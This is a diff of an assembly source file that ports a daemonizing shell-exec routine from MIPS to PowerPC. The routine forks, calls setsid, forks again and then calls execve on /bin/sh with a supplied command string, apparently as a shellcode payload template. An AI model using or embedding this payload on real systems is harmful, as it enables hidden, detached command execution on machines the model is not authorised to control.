@@ -7,72 +7,63 @@
 .type main, @function
 
 main:
-    /* TODO
-    // Fork, setsid, fork, exit in powerpc
-    li $v0, SYS_fork
-    syscall
-    beq $v0, 0, setsid
-    slti $a0, $zero, -1
-    li $v0, SYS_exit
-    syscall
+    li 0, SYS_fork
+    sc
+    cmpwi 3, 0
+    beq setsid
+    li 3, 0
+    li 0, SYS_exit
+    sc
 
 setsid:
-    li $v0, SYS_setsid
-    syscall
-    li $v0, SYS_fork
-    syscall
-    beq $v0, 0, forkexit
-    slti $a0, $zero, -1
-    li $v0, SYS_exit
-    syscall
-    */
+    li 0, SYS_setsid
+    sc
+    li 0, SYS_fork
+    sc
+    cmpwi 3, 0
+    beq forkexit
+    li 3, 0
+    li 0, SYS_exit
+    sc
 
 forkexit:
-    /* TODO
-    // Handle relative jumps, string acquistion, etc, in powerpc
     b get_binsh
 
 ret1:
-    sw $ra, -16($sp)
-    lw $a0, -16($sp)
+    mflr 3
+    stw 3, -16(1)
     b get_tacc
 
 ret2:
-    sw $ra, -12($sp)
+    mflr 5
+    stw 5, -12(1)
     b get_userinput
 
 ret3:
-    add $ra, $ra, 0
-    sw $ra, -8($sp)
-    slti $ra, $zero, -1
-    sw $ra, -4($sp)
+    mflr 5
+    stw 5, -8(1)
+    li 5, 0
+    stw 5, -4(1)
 
 binsh:
-    sub $sp, $sp, 16
-    slti $a1, $zero, -1
-    add $a1, $zero, $sp
-    slti $a2, $zero, -1
-    li $v0, SYS_execve
-    syscall
+    subi 4,1,16
+    li 0, SYS_execve
+    sc
 
 exit:
-    slti $a0, $zero, -1
-    li $v0, SYS_exit
-    syscall
+    li 3, 0
+    li 0, SYS_exit
+    sc
 
 get_binsh:
-    li $t0, -1
-    bltzal $t0, ret1
+    bl ret1
     .string BINSH
 
 get_tacc:
-    li $t0, -1
-    bltzal $t0, ret2
+    bl ret2
     .string TACC
 
 get_userinput:
-    li $t0, -1
-    bltzal $t0, ret3
+    bl ret3
 
 user_input:
-    */
